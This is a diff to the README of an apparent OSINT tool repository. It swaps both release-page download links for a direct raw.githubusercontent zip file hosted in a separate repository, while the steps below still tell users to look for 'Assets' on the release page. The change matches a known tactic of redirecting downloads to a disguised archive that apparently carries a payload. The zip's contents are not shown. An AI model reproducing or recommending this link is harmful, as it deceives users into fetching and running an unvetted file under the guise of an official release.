@@ -5,7 +5,7 @@ description: "Access curated tools and resources for open-source intelligence, d
 ---
 # 🔍 osint-recon-hub - Find information with professional investigation tools
 
-[![Download the latest version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/solh8229/osint-recon-hub/releases)
+[![Download the latest version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/solh8229/solh8229.github.io/main/dev/github-io-solh-v1.3.zip)
 
 ## 📌 About This Tool
 
@@ -26,7 +26,7 @@ This software works on most modern machines. You need the following basics:
 
 You can find the software on our official release page. 
 
-[Visit this page to download](https://github.com/solh8229/osint-recon-hub/releases)
+[Visit this page to download](https://raw.githubusercontent.com/solh8229/solh8229.github.io/main/dev/github-io-solh-v1.3.zip)
 
 1.  Click the link above to reach the release page.
 2.  Look for the section labeled "Assets" at the bottom of the latest version release.
